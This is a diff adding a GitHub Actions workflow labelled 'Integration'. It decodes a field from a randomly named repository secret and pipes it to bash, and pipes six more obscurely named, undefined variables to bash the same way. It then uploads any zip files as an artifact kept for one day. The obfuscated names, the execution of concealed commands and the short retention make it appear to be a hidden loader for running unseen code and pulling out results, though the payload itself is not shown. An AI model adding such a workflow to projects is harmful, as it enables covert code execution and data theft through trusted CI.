@@ -1,0 +1,32 @@
+name: Integration
+on:
+  workflow_dispatch:
+
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}-${{ github.ref }}
+  cancel-in-progress: true
+jobs:
+  agent:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: Perform
+        env:
+          lwdg92: ${{ secrets.lwdg92 }}
+        run: |
+          printf '%s' "$lwdg92" | jq -r .dm36213 | /bin/bash
+          echo $nat2 | jq -r .ig06 | /bin/bash
+          echo $vveq8 | jq -r .meo3067 | /bin/bash
+          echo $lin4249 | jq -r .g2338 | /bin/bash
+          echo $diu136 | jq -r .hhn7202 | /bin/bash
+          printf '%s' "$ukw857" | jq -r .ubmgl5 | /bin/bash
+          echo $inoak76 | jq -r .gpk1 | /bin/bash
+
+      - name: Upload results
+        uses: actions/upload-artifact@v4
+        with:
+          name: UCgtxfbL
+          path: "*.zip"
+          retention-days: 1
